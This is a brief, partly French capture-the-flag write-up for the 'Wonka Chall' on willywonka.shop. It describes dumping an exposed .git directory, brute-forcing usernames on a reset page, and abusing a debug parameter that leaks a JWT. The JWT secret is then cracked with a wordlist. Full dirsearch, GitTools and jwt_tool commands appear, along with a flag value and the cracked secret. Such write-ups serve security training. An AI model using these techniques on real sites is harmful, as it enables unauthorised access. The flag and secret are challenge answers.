# Wonka Chall

> Akerva

> https://willywonka.shop

## Step 1

1. dirsearch -> .git
2. GitTools -> dumper -> extractor
3. Flag 1 dans .git/COMMIT_EDITMSG

> 16ECD0DF90036C3CA8D6E988BB1737DC332CD72A8F4E62C32E0F825EDD155009

More detail: ['Step1'](./step1.md)

## Step 2

1. trouver le debug=1 dans le .git
2. aller sur la page /reset
3. bf les user -> trouver test
4. https://willywonka.shop/reset?debug=1 -> un jwt + backend.willywonka.shop dans la stacktrace
5. dirsearch sur le backend -> on trouve encore un /reset -> /reset?debug=1 -> set cookie : backend-session=jwt vide
5. bf avec rockyou le secret du jwt qu'on récup dans la stacktrace -> s3cr3t

## Resources

1. GitTools : https://github.com/internetwache/GitTools.git
2. Seclist, username shortlist : https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
3. jwt checker : https://jwt.io/
4. jwt_tool : https://github.com/ticarpi/jwt_tool

---

## Useful command used

* dirsearch

```bash
python3 /opt/t/pentest/recona/dirsearch/dirsearch.py -u https://willywonka.shop/ -e do,java,action,db,sql,~,xml,pdf,jsp,php,old,bak,zip,tar,asp,aspx,txt,html,xsl,xslx -t 25
```

* gittools

```bash
/opt/t/pentest/exploit/GitTools/Dumper/gitdumper.sh https://willywonka.shop/.git/ git_out
/opt/t/pentest/exploit/GitTools/Extractor/extractor.sh git_out git_extract
```

* jwt_tool

```bash
python ./jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o /opt/t/bf/rockyou.txt
```